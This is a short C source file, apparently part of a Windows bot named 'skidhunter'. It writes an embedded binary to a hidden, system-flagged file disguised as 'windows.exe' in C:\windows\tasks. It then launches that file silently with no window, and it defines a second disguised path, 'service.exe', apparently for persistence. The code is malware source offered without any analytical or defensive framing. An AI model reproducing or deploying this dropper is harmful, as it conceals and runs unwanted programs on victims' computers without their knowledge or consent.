#include "watcher.h"

#define bot_name "skidhunter"
#define mainpath "C:\\windows\\tasks\\service.exe"

void _exec(char *filename) {
 PROCESS_INFORMATION pi = {0};
 STARTUPINFO si = {0};
 CreateProcess(0, filename, 0, 0, 0, CREATE_NO_WINDOW, 0, 0, &si, &pi);
}

void watcher_proc() {
 int watchersize = sizeof(watcher_code) / sizeof(watcher_code[0]);
 HANDLE hfile = CreateFile("C:\\windows\\tasks\\windows.exe", GENERIC_ALL, 0, 0, CREATE_NEW, (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM), 0);
 if(hfile) {
  DWORD bwrit = 0;
  WriteFile(hfile, watcher_code, watchersize, &bwrit, 0);
  CloseHandle(hfile);
  _exec("C:\\windows\\tasks\\windows.exe");
 }
}
